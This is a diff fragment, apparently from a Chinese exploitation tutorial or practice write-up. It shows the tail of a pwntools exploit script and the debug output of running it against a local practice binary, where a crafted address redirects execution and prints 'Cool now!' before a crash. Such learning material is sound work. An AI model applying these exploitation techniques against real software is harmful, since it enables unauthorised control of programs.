@@ -25,3 +25,26 @@ p.sendline(payload)
 pause()
 
 p.recvline()
+
+
+
+效果：
+chen@ubuntu:~$ python exp.py
+[+] Starting local process './ex1': pid 3236
+[DEBUG] Sent 0x3 bytes:
+    '24\n'
+[DEBUG] Wrote gdb script to '/tmp/pwnzmXsBG.gdb'
+    file "/home/chen/ex1"
+    b *0x0804851c
+[*] running in new terminal: /usr/bin/gdb -q  "/home/chen/ex1" 3236 -x "/tmp/pwnzmXsBG.gdb"
+[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "/home/chen/ex1" 3236 -x "/tmp/pwnzmXsBG.gdb"']
+[+] Waiting for debugger: Done
+[DEBUG] Sent 0x5 bytes:
+    00000000  ed 84 04 08  0a                                     │····│·│
+    00000005
+[*] Paused (press any to continue)
+[*] Process './ex1' stopped with exit code -11 (SIGSEGV) (pid 3236)
+[DEBUG] Received 0xa bytes:
+    'Cool now!\n'
+chen@ubuntu:~$ 
+
